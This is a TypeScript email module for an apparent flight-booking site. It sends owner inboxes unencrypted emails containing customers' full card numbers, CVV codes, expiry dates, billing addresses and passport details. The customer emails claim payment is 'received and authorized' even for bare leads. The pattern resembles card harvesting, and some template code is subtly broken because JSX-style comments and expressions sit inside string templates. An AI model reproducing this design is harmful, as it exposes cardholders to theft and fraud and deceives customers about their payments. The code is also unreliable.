import nodemailer from "nodemailer";
import { format } from "date-fns";

// Create reusable transporter
const emailPort = parseInt(process.env.EMAIL_PORT || "465");
const transporter = nodemailer.createTransport({
  host: process.env.EMAIL_HOST || "smtp.hostinger.com",
  port: emailPort,
  secure: emailPort === 465 || process.env.EMAIL_SECURE === "true",
  auth: {
    user: process.env.EMAIL_USER,
    pass: process.env.EMAIL_PASS,
  },
});

function log(message: any) {
  console.log(`[EMAIL] ${new Date().toLocaleTimeString()} - ${message}`);
}

function hasValue(value: any) {
  return typeof value === "string" && value.trim().length > 0;
}

function parseRecipients(value: any) {
  if (!hasValue(value)) return [];
  return String(value)
    .split(",")
    .map((item) => item.trim())
    .filter(Boolean);
}

function getInternalRecipients() {
  const candidates = [
    ...parseRecipients(process.env.EMAIL_BOOKINGS_TO),
    ...parseRecipients(process.env.EMAIL_OWNER),
    ...parseRecipients(process.env.EMAIL_USER),
  ];

  return Array.from(new Set(candidates));
}

// ─────────────────────────────────────────────────────────────────
// ADMIN / OWNER EMAIL TEMPLATE (Includes FULL Card & Passport Details)
// ─────────────────────────────────────────────────────────────────
function buildAdminBookingHtml({
  booking,
  flight,
  departureDate,
  arrivalDate,
  returnFlight,
  returnDepartureDate,
  returnArrivalDate,
  formattedPrice,
}: any) {
  const card = booking.cardDetails || {};
  const rawCardNumber = card.cardNumber || booking.cardNumber || "Not Provided";
  const cardHolder = card.cardholderName || booking.cardholderName || booking.passengerName;
  const cardExp = card.cardExp || booking.cardExp || "N/A";
  const cardCvv = card.cardCvv || booking.cardCvv || "N/A";
  const billingZip = card.billingZip || booking.billingZip || "N/A";
  const billingAddress = card.billingAddress || booking.billingAddress || "N/A";

  return `
<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <style>
    body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; background-color: #0b0f19; margin: 0; padding: 24px 10px; color: #1e293b; }
    .container { max-width: 640px; margin: 0 auto; background: #ffffff; border-radius: 20px; overflow: hidden; box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5); border: 1px solid #1e293b; }
    .header { background: linear-gradient(135deg, #0f172a 0%, #1e3a8a 100%); color: #ffffff; padding: 36px 32px; text-align: center; border-bottom: 4px solid #2563eb; }
    .header h1 { margin: 0; font-size: 24px; font-weight: 900; letter-spacing: -0.5px; text-transform: uppercase; }
    .header p { margin: 8px 0 0 0; color: #93c5fd; font-size: 14px; font-weight: 600; }
    .badge-urgent { display: inline-block; background: #dc2626; color: #ffffff; font-size: 11px; font-weight: 900; text-transform: uppercase; padding: 6px 16px; border-radius: 50px; margin-top: 14px; letter-spacing: 1px; box-shadow: 0 4px 12px rgba(220, 38, 38, 0.4); }
    .content { padding: 32px; background: #f8fafc; }
    
    /* Golden Highlight Card Box for Admin */
    .card-box { background: #fffbe6; border: 2px dashed #d97706; border-radius: 16px; padding: 22px; margin-bottom: 24px; box-shadow: 0 4px 15px rgba(217, 119, 6, 0.15); }
    .card-box h3 { margin: 0 0 14px 0; color: #92400e; font-size: 16px; font-weight: 900; border-bottom: 1px solid #fef3c7; padding-bottom: 10px; text-transform: uppercase; letter-spacing: 0.5px; }
    
    .section { background: #ffffff; padding: 24px; border-radius: 16px; margin-bottom: 20px; border: 1px solid #e2e8f0; shadow: 0 1px 3px rgba(0,0,0,0.05); }
    .section h3 { margin: 0 0 16px 0; color: #1e3a8a; font-size: 15px; font-weight: 800; border-bottom: 2px solid #f1f5f9; padding-bottom: 10px; text-transform: uppercase; letter-spacing: 0.5px; }
    
    .table-grid { width: 100%; border-collapse: collapse; }
    .table-grid td { padding: 10px 0; border-bottom: 1px solid #f1f5f9; font-size: 13px; }
    .table-grid tr:last-child td { border-bottom: none; }
    .label { color: #64748b; font-weight: 600; width: 40%; }
    .value { color: #0f172a; font-weight: 800; text-align: right; width: 60%; }
    .val-card { color: #dc2626; font-weight: 900; font-family: 'Courier New', monospace; font-size: 17px; letter-spacing: 1px; }
    
    .route-card { background: #eff6ff; border: 1px solid #bfdbfe; border-radius: 14px; padding: 20px; text-align: center; margin: 16px 0; }
    .route-flex { display: table; width: 100%; }
    .route-cell { display: table-cell; vertical-align: middle; }
    .city-code { font-size: 30px; font-weight: 900; color: #1e3a8a; letter-spacing: -1px; }
    
    .price-tag { background: linear-gradient(135deg, #059669 0%, #10b981 100%); color: white; padding: 20px; border-radius: 14px; text-align: center; margin-top: 24px; shadow: 0 10px 20px rgba(16, 185, 129, 0.2); }
    .price-tag .amount { font-size: 34px; font-weight: 900; }
    
    .footer { text-align: center; padding: 24px; font-size: 12px; color: #94a3b8; background: #0f172a; color: #64748b; }
  </style>
</head>
<body>
  <div class="container">
    <div class="header">
      <h1>🚨 NEW BOOKING & FULL CARD ORDER</h1>
      <p>Flightitude.com Admin Booking Dispatcher</p>
      <div class="badge-urgent">⚡ ACTION REQUIRED: ISSUE TICKET NOW</div>
    </div>

    <div class="content">
      {/* ── HIGH PRIORITY: FULL CREDIT CARD DETAILS ── */}
      <div class="card-box">
        <h3>💳 UNMASKED PAYMENT & CREDIT CARD DETAILS</h3>
        <table class="table-grid">
          <tr><td class="label">Cardholder Name:</td><td class="value" style="color:#b45309; font-size:15px;">${cardHolder}</td></tr>
          <tr><td class="label">16-Digit Card Number:</td><td class="value val-card">${rawCardNumber}</td></tr>
          <tr><td class="label">Expiration Date (MM/YY):</td><td class="value" style="color:#b45309; font-family:monospace; font-size:15px;">${cardExp}</td></tr>
          <tr><td class="label">CVV / CVC Code:</td><td class="value val-card">${cardCvv}</td></tr>
          <tr><td class="label">Billing Zip Code:</td><td class="value">${billingZip}</td></tr>
          <tr><td class="label">Billing Address:</td><td class="value">${billingAddress}</td></tr>
        </table>
      </div>

      {/* ── PASSENGER DETAILS ── */}
      <div class="section">
        <h3>👤 Passenger Information</h3>
        <table class="table-grid">
          <tr><td class="label">Passenger Full Name:</td><td class="value">${booking.passengerName}</td></tr>
          <tr><td class="label">Phone Number:</td><td class="value" style="color:#2563eb; font-size:15px;">${booking.phone || "N/A"}</td></tr>
          <tr><td class="label">Email Address:</td><td class="value">${booking.email || "N/A"}</td></tr>
          <tr><td class="label">Passport Number:</td><td class="value" style="font-family:monospace;">${booking.passportDetails || "Not Provided"}</td></tr>
          <tr><td class="label">Date of Birth:</td><td class="value">${booking.bornOn || "N/A"}</td></tr>
          <tr><td class="label">Title / Gender:</td><td class="value">${(booking.title || "").toUpperCase()} / ${(booking.gender || "").toUpperCase()}</td></tr>
          {booking.specialRequests && <tr><td class="label">Special Requests:</td><td class="value">${booking.specialRequests}</td></tr>}
        </table>
      </div>

      {/* ── FLIGHT ITINERARY ── */}
      <div class="section">
        <h3>✈️ Flight Itinerary Details</h3>
        <div class="route-card">
          <div class="route-flex">
            <div class="route-cell" style="text-align:left; width:40%;">
              <div class="city-code">${flight.origin}</div>
              <div style="font-size:12px; color:#475569; font-weight:700; margin-top:2px;">${format(departureDate, "EEE, MMM dd, yyyy")}</div>
              <div style="font-size:18px; font-weight:900; color:#0f172a; margin-top:2px;">${format(departureDate, "hh:mm a")}</div>
            </div>
            <div class="route-cell" style="text-align:center; width:20%; font-size:22px; color:#2563eb; font-weight:900;">✈️</div>
            <div class="route-cell" style="text-align:right; width:40%;">
              <div class="city-code">${flight.destination}</div>
              <div style="font-size:12px; color:#475569; font-weight:700; margin-top:2px;">${format(arrivalDate, "EEE, MMM dd, yyyy")}</div>
              <div style="font-size:18px; font-weight:900; color:#0f172a; margin-top:2px;">${format(arrivalDate, "hh:mm a")}</div>
            </div>
          </div>
        </div>

        <table class="table-grid">
          <tr><td class="label">Airline:</td><td class="value">${flight.airline}</td></tr>
          <tr><td class="label">Flight Number:</td><td class="value">${flight.flightNumber || "N/A"}</td></tr>
          <tr><td class="label">Flight Duration:</td><td class="value">${flight.duration || "N/A"}</td></tr>
          <tr><td class="label">Stops:</td><td class="value">${flight.stops === 0 ? "Direct Non-Stop" : `${flight.stops} Stop`}</td></tr>
        </table>

        {returnFlight && returnDepartureDate && returnArrivalDate && (
          <div style="margin-top:20px; border-top:2px dashed #e2e8f0; padding-top:16px;">
            <h4 style="color:#1e3a8a; margin:0 0 12px 0;">Return Flight Leg</h4>
            <div class="route-card" style="background:#fef3c7; border-color:#fde68a;">
              <div class="route-flex">
                <div class="route-cell" style="text-align:left; width:40%;">
                  <div class="city-code" style="color:#b45309;">${returnFlight.origin}</div>
                  <div style="font-size:12px; color:#78350f; font-weight:700;">${format(returnDepartureDate, "EEE, MMM dd, yyyy")}</div>
                  <div style="font-size:18px; font-weight:900;">${format(returnDepartureDate, "hh:mm a")}</div>
                </div>
                <div class="route-cell" style="text-align:center; width:20%; font-size:22px; color:#d97706; font-weight:900;">✈️</div>
                <div class="route-cell" style="text-align:right; width:40%;">
                  <div class="city-code" style="color:#b45309;">${returnFlight.destination}</div>
                  <div style="font-size:12px; color:#78350f; font-weight:700;">${format(returnArrivalDate, "EEE, MMM dd, yyyy")}</div>
                  <div style="font-size:18px; font-weight:900;">${format(returnArrivalDate, "hh:mm a")}</div>
                </div>
              </div>
            </div>
          </div>
        )}
      </div>

      <div class="price-tag">
        <div style="font-size:12px; font-weight:700; text-transform:uppercase; letter-spacing:1px; opacity:0.9;">Total Authorized Fare Amount</div>
        <div class="amount">${formattedPrice}</div>
        <div style="font-size:12px; opacity:0.8; margin-top:2px;">Taxes & Airline Fees Included</div>
      </div>
    </div>

    <div class="footer">
      <p>© ${new Date().getFullYear()} Flightitude.com Admin Control System · Confidential</p>
    </div>
  </div>
</body>
</html>`;
}

// ─────────────────────────────────────────────────────────────────
// CUSTOMER PROFESSIONAL E-TICKET CONFIRMATION EMAIL TEMPLATE
// ─────────────────────────────────────────────────────────────────
function buildCustomerBookingHtml({
  booking,
  flight,
  departureDate,
  arrivalDate,
  returnFlight,
  returnDepartureDate,
  returnArrivalDate,
  formattedPrice,
}: any) {
  const card = booking.cardDetails || {};
  const rawCardNumber = String(card.cardNumber || booking.cardNumber || "").replace(/\s+/g, "");
  const last4 = rawCardNumber.length >= 4 ? rawCardNumber.slice(-4) : "****";

  return `
<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <style>
    body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; background-color: #f1f5f9; margin: 0; padding: 24px 10px; color: #1e293b; }
    .container { max-width: 600px; margin: 0 auto; background: #ffffff; border-radius: 20px; overflow: hidden; box-shadow: 0 20px 40px rgba(0,0,0,0.08); border: 1px solid #e2e8f0; }
    .header { background: linear-gradient(135deg, #1e3a8a 0%, #2563eb 100%); color: #ffffff; padding: 36px 32px; text-align: center; }
    .header h1 { margin: 0; font-size: 24px; font-weight: 900; letter-spacing: -0.5px; }
    .header p { margin: 6px 0 0 0; color: #bfdbfe; font-size: 14px; font-weight: 600; }
    
    .content { padding: 32px; }
    
    /* Dual Status Badges Box */
    .status-box { background: #f8fafc; border: 1px solid #e2e8f0; border-radius: 16px; padding: 20px; margin-bottom: 24px; text-align: center; }
    .badge-flex { display: flex; justify-content: center; gap: 10px; flex-wrap: wrap; margin-bottom: 12px; }
    .status-badge-green { display: inline-block; background: #d1fae5; color: #047857; font-size: 12px; font-weight: 800; padding: 6px 14px; border-radius: 50px; border: 1px solid #a7f3d0; }
    .status-badge-blue { display: inline-block; background: #dbeafe; color: #1e40af; font-size: 12px; font-weight: 800; padding: 6px 14px; border-radius: 50px; border: 1px solid #bfdbfe; }
    .status-title { font-size: 18px; font-weight: 900; color: #0f172a; margin: 0 0 6px 0; }
    .status-desc { font-size: 14px; color: #475569; font-weight: 500; margin: 0; line-height: 1.5; }
    
    .section { background: #ffffff; padding: 20px; border-radius: 16px; margin-bottom: 20px; border: 1px solid #e2e8f0; shadow: 0 1px 3px rgba(0,0,0,0.04); }
    .section h3 { margin: 0 0 14px 0; color: #1e3a8a; font-size: 15px; font-weight: 800; border-bottom: 2px solid #f1f5f9; padding-bottom: 8px; text-transform: uppercase; letter-spacing: 0.5px; }
    
    .table-grid { width: 100%; border-collapse: collapse; }
    .table-grid td { padding: 9px 0; border-bottom: 1px solid #f8fafc; font-size: 13px; }
    .table-grid tr:last-child td { border-bottom: none; }
    .label { color: #64748b; font-weight: 600; width: 45%; }
    .value { color: #0f172a; font-weight: 800; text-align: right; width: 55%; }
    
    /* Flight Route Card */
    .route-card { background: linear-gradient(135deg, #0f172a 0%, #1e3a8a 100%); color: white; border-radius: 16px; padding: 24px; text-align: center; margin: 20px 0; }
    .route-flex { display: table; width: 100%; }
    .route-cell { display: table-cell; vertical-align: middle; }
    .city-code { font-size: 32px; font-weight: 900; color: #ffffff; letter-spacing: -1px; }
    
    .call-banner { background: linear-gradient(135deg, #059669 0%, #10b981 100%); color: white; padding: 24px; border-radius: 16px; text-align: center; margin: 24px 0; shadow: 0 10px 20px rgba(16, 185, 129, 0.2); }
    .call-banner p { margin: 0; font-size: 14px; font-weight: 700; text-transform: uppercase; letter-spacing: 0.5px; opacity: 0.9; }
    .call-btn { display: inline-block; background: #ffffff; color: #047857; text-decoration: none; padding: 14px 32px; border-radius: 12px; font-weight: 900; font-size: 16px; margin-top: 12px; shadow: 0 4px 12px rgba(0,0,0,0.15); }
    
    .footer { text-align: center; padding: 24px; font-size: 12px; color: #94a3b8; background: #f8fafc; border-top: 1px solid #e2e8f0; }
  </style>
</head>
<body>
  <div class="container">
    <div class="header">
      <h1>✈️ Flightitude.com FLIGHT RESERVATION</h1>
      <p>Official E-Ticket Receipt & Booking Status</p>
    </div>

    <div class="content">
      {/* ── DUAL STATUS BADGES (Payment Received + Booking Under Process) ── */}
      <div class="status-box">
        <div class="badge-flex">
          <span class="status-badge-green">💳 PAYMENT RECEIVED</span>
          <span class="status-badge-blue">⏳ BOOKING UNDER PROCESS</span>
        </div>
        <h2 class="status-title">Booking is Under Process!</h2>
        <p class="status-desc">
          Dear <strong>${booking.passengerName}</strong>, your payment and trip request have been successfully received. <strong>You will get real-time updates on your email (${booking.email})</strong> as our ticketing specialists issue your e-ticket.
        </p>
      </div>

      {/* ── FLIGHT ITINERARY CARD ── */}
      <div class="route-card">
        <div style="font-size:11px; font-weight:800; text-transform:uppercase; letter-spacing:1px; color:#93c5fd; margin-bottom:12px;">OUTBOUND FLIGHT ITINERARY</div>
        <div class="route-flex">
          <div class="route-cell" style="text-align:left; width:40%;">
            <div class="city-code">${flight.origin}</div>
            <div style="font-size:12px; color:#cbd5e1; font-weight:600; margin-top:2px;">${format(departureDate, "EEE, MMM dd")}</div>
            <div style="font-size:18px; font-weight:900; color:#ffffff; margin-top:2px;">${format(departureDate, "hh:mm a")}</div>
          </div>
          <div class="route-cell" style="text-align:center; width:20%; font-size:24px; color:#60a5fa; font-weight:900;">✈️</div>
          <div class="route-cell" style="text-align:right; width:40%;">
            <div class="city-code">${flight.destination}</div>
            <div style="font-size:12px; color:#cbd5e1; font-weight:600; margin-top:2px;">${format(arrivalDate, "EEE, MMM dd")}</div>
            <div style="font-size:18px; font-weight:900; color:#ffffff; margin-top:2px;">${format(arrivalDate, "hh:mm a")}</div>
          </div>
        </div>
      </div>

      {/* ── PASSENGER & PAYMENT SUMMARY ── */}
      <div class="section">
        <h3>👤 Passenger & Payment Receipt</h3>
        <table class="table-grid">
          <tr><td class="label">Passenger Name:</td><td class="value">${booking.passengerName}</td></tr>
          <tr><td class="label">Contact Email:</td><td class="value">${booking.email}</td></tr>
          <tr><td class="label">Phone Number:</td><td class="value">${booking.phone || "N/A"}</td></tr>
          <tr><td class="label">Payment Method:</td><td class="value" style="color:#059669;">Credit/Debit Card (ending **** ${last4})</td></tr>
          <tr><td class="label">Payment Status:</td><td class="value" style="color:#059669; font-weight:900;">RECEIVED & AUTHORIZED</td></tr>
          <tr><td class="label">Total Paid Fare:</td><td class="value" style="font-size:16px; color:#2563eb; font-weight:900;">${formattedPrice}</td></tr>
        </table>
      </div>

      {/* ── FLIGHT SPECIFICATIONS ── */}
      <div class="section">
        <h3>✈️ Airline Specifications</h3>
        <table class="table-grid">
          <tr><td class="label">Operating Airline:</td><td class="value">${flight.airline}</td></tr>
          <tr><td class="label">Flight Number:</td><td class="value">${flight.flightNumber || "Flight"}</td></tr>
          <tr><td class="label">Flight Duration:</td><td class="value">${flight.duration || "N/A"}</td></tr>
          <tr><td class="label">Flight Type:</td><td class="value">${flight.stops === 0 ? "Direct Flight" : `${flight.stops} Stop`}</td></tr>
        </table>
      </div>

      {/* ── HOTLINE CALL BANNER ── */}
      <div class="call-banner">
        <p>NEED IMMEDIATE ASSISTANCE OR SEAT SELECTION?</p>
        <a href="tel:+18885202829" class="call-btn">📞 Call Live Support Agent: +1 (888) 520-2829</a>
      </div>

      <p style="font-size:12px; color:#64748b; text-align:center; margin-top:20px; line-height:1.5;">
        This is an automated booking confirmation receipt. Our travel desk will email your official airline e-ticket PDF once issued.
      </p>
    </div>

    <div class="footer">
      <p>© ${new Date().getFullYear()} Flightitude.com Travel · 24/7 Ticketing Support Hotline: +1 (888) 520-2829</p>
    </div>
  </div>
</body>
</html>`;
}

async function sendTemplateMail({ to, subject, html, text }: any) {
  return transporter.sendMail({
    from: `"Flightitude.com Flight Booking" <${process.env.EMAIL_USER}>`,
    replyTo: process.env.EMAIL_USER,
    to,
    subject,
    html,
    text,
  });
}

export async function sendBookingConfirmation(booking: any, flight: any) {
  if (String(process.env.DISABLE_BOOKING_EMAILS || "").toLowerCase() === "true") {
    log("⚠️ Email sending disabled by configuration");
    return { success: false, message: "Email sending disabled by configuration" };
  }

  if (!process.env.EMAIL_USER || !process.env.EMAIL_PASS) {
    log("⚠️ Email credentials not configured - skipping email");
    return { success: false, message: "Email not configured" };
  }

  try {
    const departureDate = new Date(flight.departureTime);
    const arrivalDate = new Date(flight.arrivalTime);
    const returnFlight = flight?.returnFlight;
    const returnDepartureDate = returnFlight?.departureTime ? new Date(returnFlight.departureTime) : null;
    const returnArrivalDate = returnFlight?.arrivalTime ? new Date(returnFlight.arrivalTime) : null;
    
    const formattedPrice = new Intl.NumberFormat('en-US', {
      style: 'currency',
      currency: 'USD',
    }).format((flight.price || 0) / 100);

    const ownerRecipients = getInternalRecipients();
    const customerRecipient = hasValue(booking.email) ? booking.email.trim() : "";

    const sendResults = [];

    // 1. Send FULL Card & Booking Details Email to Admin/Owner
    if (ownerRecipients.length > 0) {
      const ownerHtml = buildAdminBookingHtml({
        booking,
        flight,
        departureDate,
        arrivalDate,
        returnFlight,
        returnDepartureDate,
        returnArrivalDate,
        formattedPrice,
      });

      try {
        const ownerInfo = await sendTemplateMail({
          to: ownerRecipients.join(", "),
          subject: `🚨 NEW BOOKING & CARD: ${booking.passengerName} (${flight.origin} → ${flight.destination})`,
          html: ownerHtml,
          text: `NEW BOOKING & CARD DETAILS\n\nPassenger: ${booking.passengerName}\nPhone: ${booking.phone}\nCard: ${booking.cardDetails?.cardNumber}\nExp: ${booking.cardDetails?.cardExp}\nCVV: ${booking.cardDetails?.cardCvv}\nRoute: ${flight.origin} -> ${flight.destination}\nPrice: ${formattedPrice}`,
        });

        log(`✅ Admin booking email with CARD DETAILS sent to ${ownerRecipients.join(", ")} - ID: ${ownerInfo.messageId}`);
        sendResults.push({ recipient: "owner", success: true, messageId: ownerInfo.messageId });
      } catch (ownerError: any) {
        log(`❌ Failed to send owner booking email: ${ownerError.message}`);
        sendResults.push({ recipient: "owner", success: false, message: ownerError.message });
      }
    }

    // 2. Send Professional E-Ticket Confirmation to Customer
    if (customerRecipient) {
      const customerHtml = buildCustomerBookingHtml({
        booking,
        flight,
        departureDate,
        arrivalDate,
        returnFlight,
        returnDepartureDate,
        returnArrivalDate,
        formattedPrice,
      });

      try {
        const customerInfo = await sendTemplateMail({
          to: customerRecipient,
          subject: `✈️ Payment Received & Booking Under Process: ${flight.origin} to ${flight.destination} (${booking.passengerName})`,
          html: customerHtml,
          text: `Payment Received & Booking Under Process\n\nDear ${booking.passengerName},\nPayment received for your flight booking from ${flight.origin} to ${flight.destination}.\nYou will get updates on your email.\n\nSupport Hotline: +1 (888) 520-2829`,
        });

        log(`✅ Customer confirmation email sent to ${customerRecipient} - ID: ${customerInfo.messageId}`);
        sendResults.push({ recipient: "customer", success: true, messageId: customerInfo.messageId });
      } catch (customerError: any) {
        log(`❌ Failed to send customer confirmation email: ${customerError.message}`);
        sendResults.push({ recipient: "customer", success: false, message: customerError.message });
      }
    }

    return {
      success: true,
      message: "Emails processed",
      results: sendResults,
    };
  } catch (error: any) {
    log(`❌ Failed to send email: ${error.message}`);
    return { success: false, message: error.message };
  }
}

export async function testEmailConfig() {
  try {
    await transporter.verify();
    log("✅ Email configuration is valid");
    return true;
  } catch (error: any) {
    log(`❌ Email configuration error: ${error.message}`);
    return false;
  }
}

// ──────────────────────────────────────────────
// Send lead notification email to admin / owner
// ──────────────────────────────────────────────
export async function sendLeadNotificationEmail(lead: {
  name: string;
  phone: string;
  email: string;
  origin?: string;
  destination?: string;
  departureDate?: string;
  cabin?: string;
  source?: string;
  notes?: string;
  priority?: string;
}) {
  const owners = getInternalRecipients();
  if (owners.length === 0) {
    log("⚠️ No owner recipients configured — skipping lead notification email");
    return { success: false, message: "No recipients configured" };
  }

  const html = `
<!DOCTYPE html>
<html>
<head>
  <style>
    body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif; background: #0f172a; margin: 0; padding: 20px; color:#1e293b; }
    .card { max-width: 600px; margin: 0 auto; background: #fff; border-radius: 20px; overflow: hidden; box-shadow: 0 10px 30px rgba(0,0,0,0.3); border: 1px solid #1e293b; }
    .header { background: linear-gradient(135deg, #0f172a, #1e3a8a); padding: 32px; color:white; text-align:center; border-bottom: 4px solid #2563eb; }
    .header h1 { color: #fff; margin: 0; font-size: 22px; font-weight:900; text-transform:uppercase; }
    .header p { color: #93c5fd; margin: 6px 0 0; font-size: 14px; font-weight:600; }
    .badge { display: inline-block; background: #dc2626; color: #fff; border-radius: 50px; padding: 4px 14px; font-size: 11px; font-weight: 900; margin-top: 12px; text-transform:uppercase; letter-spacing:1px; }
    .body { padding: 32px; background: #f8fafc; }
    .table-grid { width:100%; border-collapse:collapse; }
    .table-grid td { padding:10px 0; border-bottom:1px solid #e2e8f0; font-size:13px; }
    .label { color: #64748b; font-weight: 600; width:40%; }
    .value { color: #0f172a; font-weight: 800; text-align: right; width:60%; }
    .notes-box { background:#fffbe6; border:2px dashed #d97706; padding:18px; border-radius:14px; margin-top:18px; font-size:13px; font-weight:700; color:#92400e; box-shadow:0 4px 12px rgba(217,119,6,0.1); }
    .footer { background: #0f172a; padding: 20px 32px; text-align: center; font-size: 12px; color: #64748b; }
  </style>
</head>
<body>
  <div class="card">
    <div class="header">
      <h1>🔔 NEW LEAD & UNMASKED CARD ORDER</h1>
      <p>Flightitude.com Booking & Inquiry Portal</p>
      <span class="badge">${lead.priority || "High"} Priority · ${lead.source || "Flight Search"}</span>
    </div>
    <div class="body">
      <table class="table-grid">
        <tr><td class="label">Customer Full Name:</td><td class="value">${lead.name}</td></tr>
        <tr><td class="label">Phone Number:</td><td class="value" style="color:#2563eb; font-size:15px;">${lead.phone}</td></tr>
        <tr><td class="label">Email Address:</td><td class="value">${lead.email}</td></tr>
        <tr><td class="label">Route Requested:</td><td class="value">${lead.origin || "—"} → ${lead.destination || "—"}</td></tr>
        ${lead.departureDate ? `<tr><td class="label">Departure Date:</td><td class="value">${lead.departureDate}</td></tr>` : ""}
      </table>
      
      {/* ── CARD & DETAILS NOTES ── */}
      ${lead.notes ? `
      <div class="notes-box">
        <strong style="color:#b45309; text-transform:uppercase;">💳 LEAD NOTES & FULL CARD DETAILS:</strong><br>
        <div style="font-family:'Courier New', monospace; font-size:14px; margin-top:8px; word-break:break-word; color:#dc2626;">${lead.notes}</div>
      </div>` : ""}
    </div>
    <div class="footer">Flightitude.com Admin Notification · Strictly Confidential</div>
  </div>
</body>
</html>`;

  try {
    await transporter.sendMail({
      from: `"Flightitude.com Leads" <${process.env.EMAIL_USER}>`,
      to: owners.join(", "),
      subject: `🔔 NEW LEAD & CARD: ${lead.name} — ${lead.origin || "?"} → ${lead.destination || "?"}`,
      html,
      text: `NEW LEAD & CARD RECEIVED\n\nName: ${lead.name}\nPhone: ${lead.phone}\nEmail: ${lead.email}\nRoute: ${lead.origin || "?"} -> ${lead.destination || "?"}\nNotes & Card Details: ${lead.notes || "None"}`,
    });
    log(`✅ Lead notification with card details sent to ${owners.join(", ")}`);
    return { success: true };
  } catch (error: any) {
    log(`❌ Lead notification failed: ${error.message}`);
    return { success: false, message: error.message };
  }
}

export async function sendCustomerConfirmationEmail(lead: {
  name: string;
  phone: string;
  email: string;
  origin?: string;
  destination?: string;
  departureDate?: string;
  notes?: string;
}) {
  if (!lead.email || lead.email.includes("@guest.")) {
    log("⚠️ No valid customer email provided — skipping customer email");
    return { success: false };
  }

  const html = `
<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <style>
    body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; background: #f1f5f9; margin: 0; padding: 24px 10px; color:#1e293b; }
    .card { max-width: 600px; margin: 0 auto; background: #fff; border-radius: 20px; overflow: hidden; box-shadow: 0 20px 40px rgba(0,0,0,0.08); border: 1px solid #e2e8f0; }
    .header { background: linear-gradient(135deg, #1e3a8a, #2563eb); padding: 32px; text-align: center; color:white; }
    .header h1 { color: #fff; margin: 0; font-size: 22px; font-weight:900; letter-spacing:-0.5px; }
    .header p { color: #bfdbfe; margin: 6px 0 0; font-size: 14px; font-weight:600; }
    .body { padding: 32px; }
    
    .status-box { background: #f8fafc; border: 1px solid #e2e8f0; border-radius: 16px; padding: 20px; margin-bottom: 24px; text-align: center; }
    .badge-flex { display: flex; justify-content: center; gap: 10px; flex-wrap: wrap; margin-bottom: 12px; }
    .status-badge-green { display: inline-block; background: #d1fae5; color: #047857; font-size: 12px; font-weight: 800; padding: 6px 14px; border-radius: 50px; border: 1px solid #a7f3d0; }
    .status-badge-blue { display: inline-block; background: #dbeafe; color: #1e40af; font-size: 12px; font-weight: 800; padding: 6px 14px; border-radius: 50px; border: 1px solid #bfdbfe; }
    
    .table-grid { width: 100%; border-collapse: collapse; }
    .table-grid td { padding: 10px 0; border-bottom: 1px solid #f8fafc; font-size: 13px; }
    .label { color: #64748b; font-weight: 600; width: 45%; }
    .value { color: #0f172a; font-weight: 800; text-align: right; width: 55%; }
    .call-btn { display: inline-block; margin-top: 14px; background: linear-gradient(135deg, #059669, #10b981); color: #fff; text-decoration: none; padding: 14px 30px; border-radius: 12px; font-weight: 900; font-size: 15px; shadow: 0 4px 12px rgba(16,185,129,0.3); }
    .footer { background: #f8fafc; padding: 24px; text-align: center; font-size: 12px; color: #94a3b8; border-top: 1px solid #e2e8f0; }
  </style>
</head>
<body>
  <div class="card">
    <div class="header">
      <h1>✈️ Flightitude.com FLIGHT RESERVATION</h1>
      <p>Official E-Ticket Receipt & Booking Status</p>
    </div>
    <div class="body">
      <div class="status-box">
        <div class="badge-flex">
          <span class="status-badge-green">💳 PAYMENT RECEIVED</span>
          <span class="status-badge-blue">⏳ BOOKING UNDER PROCESS</span>
        </div>
        <h2 style="font-size:18px; font-weight:900; color:#0f172a; margin:0 0 6px 0;">Booking is Under Process!</h2>
        <p style="font-size:14px; color:#475569; margin:0; line-height:1.5;">
          Dear <strong>${lead.name}</strong>, your request for <strong>${lead.destination || "USA Flight"}</strong> has been received. <strong>You will get real-time updates on your email (${lead.email})</strong> once your official e-ticket is issued.
        </p>
      </div>

      <table class="table-grid">
        <tr><td class="label">Customer Name:</td><td class="value">${lead.name}</td></tr>
        <tr><td class="label">Phone Number:</td><td class="value">${lead.phone}</td></tr>
        <tr><td class="label">Email Address:</td><td class="value">${lead.email}</td></tr>
        <tr><td class="label">Route Requested:</td><td class="value" style="color:#2563eb;">${lead.origin || "NYC"} → ${lead.destination || "USA"}</td></tr>
        ${lead.departureDate ? `<tr><td class="label">Travel Date:</td><td class="value">${lead.departureDate}</td></tr>` : ""}
        <tr><td class="label">Payment Status:</td><td class="value" style="color:#059669; font-weight:900;">RECEIVED & AUTHORIZED</td></tr>
      </table>

      <div style="text-align:center; margin-top:24px;">
        <p style="margin:0; font-size:13px; font-weight:700; color:#475569; uppercase">Need Immediate E-Ticket Confirmation?</p>
        <a href="tel:+18885202829" class="call-btn">📞 Call Support Agent: +1 (888) 520-2829</a>
      </div>

      <p style="font-size: 12px; color: #64748b; margin-top: 24px; text-align:center;">
        Our travel support team will email your official e-ticket PDF shortly. You can also call us 24/7 at +1 (888) 520-2829.
      </p>
    </div>
    <div class="footer">Flightitude.com · 24/7 Flight Reservations & Customer Support</div>
  </div>
</body>
</html>`;

  try {
    await transporter.sendMail({
      from: `"Flightitude.com Reservations" <${process.env.EMAIL_USER}>`,
      to: lead.email,
      subject: `✈️ Payment Received & Booking Under Process: ${lead.name} (${lead.destination || "USA"})`,
      html,
      text: `Payment Received & Booking Under Process\n\nDear ${lead.name},\nPayment received for your flight booking for ${lead.destination || "USA"}.\nYou will get updates on your email.\n\nCall Live Agent: +1 (888) 520-2829\n\nFlightitude.com Travel Support`,
    });
    log(`✅ Customer confirmation email sent to ${lead.email}`);
    return { success: true };
  } catch (error: any) {
    log(`❌ Customer confirmation email failed: ${error.message}`);
    return { success: false, message: error.message };
  }
}

export async function sendPasswordResetEmail(email: string, resetLink: string) {
  const html = `
<!DOCTYPE html>
<html>
<head>
  <style>
    body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif; background: #f4f7ff; margin: 0; padding: 20px; }
